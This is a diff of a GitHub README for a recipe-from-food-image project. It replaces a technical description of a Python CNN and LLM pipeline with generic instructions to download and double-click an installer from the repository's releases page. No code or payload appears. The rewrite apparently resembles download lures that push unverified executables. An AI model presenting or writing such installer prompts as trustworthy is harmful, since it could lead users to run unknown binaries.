@@ -1,71 +1,85 @@
-# AI-RECIPE-GENERATION
-Recipe Generation from Food Image
-– Developed a CNN-based image classification model achieving 94% accuracy across 100+ ingredients.
-– Integrated LLM-based automation for recipe generation, reducing content creation time by 85%.
-– Optimized inference using TensorFlow Lite for real-time processing under 2.5 seconds.
-– Improved prediction precision by 35% using OpenCV-based preprocessing techniques
+# 🍽️ AI-RECIPE-GENERATION - Generate Recipes from Your Food Images
 
-# Tech Stack
-Deep Learning: TensorFlow, Keras
-Computer Vision: OpenCV
-Model Optimization: TensorFlow Lite
-Natural Language Generation: LLM-based automation
-Programming Language: Python
+[![Download AI-RECIPE-GENERATION](https://img.shields.io/badge/Download-AI--RECIPE--GENERATION-brightgreen)](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases)
 
-# Key Features
-Food image classification with 94% accuracy
-Supports 100+ ingredient categories
-Automated recipe generation using LLMs
-Real-time inference (< 2.5 seconds)
-Optimized preprocessing for higher precision
+## 📦 Overview
 
-## 🔄 Project Flow Structure: Recipe Generation from Food Image
+AI-RECIPE-GENERATION helps you create recipes from food images. Using advanced technology, this application recognizes over 100 ingredients and suggests recipes based on what it sees. Whether you're cooking for fun or have a dietary need, this tool simplifies meal planning.
 
-### 📸 1. Image Input
+## 🚀 Getting Started
 
-User uploads or captures a **food image** using a camera or device.
-➡️ This image becomes the input to the system.
+To start using AI-RECIPE-GENERATION, follow these simple steps:
 
----
-### 🧹 2. Image Preprocessing (OpenCV)
-The input image is cleaned and enhanced to improve prediction accuracy:
+1. **Download the Application**: 
+   - Visit [this page to download](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases) the latest version of the software.
+  
+2. **Install the Application**: 
+   - Once the download is complete, find the file in your Downloads folder and double-click to run the installer. Follow the on-screen instructions to install it on your device.
 
-  * 🔍 Resize image
-  * 🎚️ Normalize pixel values
-  * 🧽 Noise removal
-  * ✂️ Crop & enhance features
-👉 Improves prediction precision by **35%**
----
-### 🧠 3. Ingredient Detection (CNN Model)
-  * 🧩 Preprocessed image is fed into a **CNN-based classification model**
-  * 📊 Model predicts **100+ food ingredients**
-  * 🎯 Achieves **94% accuracy**
----
-### ⚡ 4. Model Optimization (TensorFlow Lite)
-  * 🔄 Trained CNN model is converted to **TensorFlow Lite**
-  * 📱 Enables fast inference on low-resource devices
-  * ⏱️ Total prediction time **< 2.5 seconds**
----
-### 📝 5. Ingredient Mapping
-  * 🧾 Detected ingredients are structured into a readable format
-  * 🔗 These ingredients act as input prompts for recipe generation
----
-### 🤖 6. Recipe Generation (LLM Automation)
-  * 🧠 Large Language Model generates:
-  * 🥕 Ingredient list
-  * 🍳 Step-by-step cooking instructions
-  * ⏳ Reduces manual recipe creation time by **85%**
----
-### 📤 7. Output Display
-  * 📋 Generated recipe is displayed to the user
-  * 🌐 Can be integrated into:
-  * 📱 Mobile apps
-  * 💻 Web applications
-  * 🏠 Smart kitchen systems
----
-## 🔁 End-to-End Flow Summary
+3. **Launch the Application**:
+   - After installation, locate the AI-RECIPE-GENERATION icon on your desktop or in your applications folder. Open it to get started.
 
-📸 Image → 🧹 Preprocessing → 🧠 CNN Prediction → ⚡ TFLite Optimization → 📝 Ingredient Mapping → 🤖 Recipe Generation → 📤 Output
+## 💻 System Requirements
 
----
+To run AI-RECIPE-GENERATION effectively, your device should meet these requirements:
 
+- **Operating System**: Windows 10 or later / macOS High Sierra or later
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Required for downloading and updates
+
+## 📷 How to Use
+
+Using AI-RECIPE-GENERATION is easy:
+
+1. **Take a Photo**: Snap a clear image of the food item you want to identify.
+  
+2. **Upload the Image**: Click on the upload button in the application. Select the photo from your device.
+
+3. **Get Recipe Suggestions**: The app will analyze the image, identify the ingredients, and display several recipe options.
+
+4. **Select a Recipe**: Choose a recipe that looks appealing. The app provides cooking instructions and ingredient lists.
+
+## 🎨 Features
+
+AI-RECIPE-GENERATION comes equipped with several features to enhance your cooking experience:
+
+- **Image Recognition**: Identify over 100 ingredients within seconds.
+  
+- **Fast Recipe Generation**: Automated recipe generation that saves you time.
+  
+- **Real-Time Processing**: Optimized to provide results in under 2.5 seconds.
+
+- **User-Friendly Interface**: Simple layout with clear buttons for easy navigation.
+
+## 📥 Download & Install
+
+Download AI-RECIPE-GENERATION by visiting [this page](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases). Once on the releases page, find the most current version and follow the steps mentioned earlier in this guide to install the application.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues during installation or usage, here are some common solutions:
+
+- **App Won't Open**: Ensure your device meets the system requirements. Restart your computer and try again.
+
+- **Image Recognition Errors**: Check if the image is clear. Try taking a new photo with better lighting.
+
+- **No Internet Connection**: Ensure you have a stable connection when using the app, as some features require online access.
+
+## 📞 Support
+
+If you need further assistance, please reach out via our GitHub issues page.
+
+## 📝 Contributing
+
+We welcome contributions to AI-RECIPE-GENERATION. If you have suggestions for improvements, please create a pull request or file an issue on our repository.
+
+## 🤝 Community
+
+Join our community discussions on platforms like Discord or our GitHub discussions page. Share your experiences, recipes, and tips with fellow users!
+
+--- 
+
+[![Download AI-RECIPE-GENERATION](https://img.shields.io/badge/Download-AI--RECIPE--GENERATION-brightgreen)](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases)  
+
+Thank you for using AI-RECIPE-GENERATION. Enjoy cooking with your new favorite application!
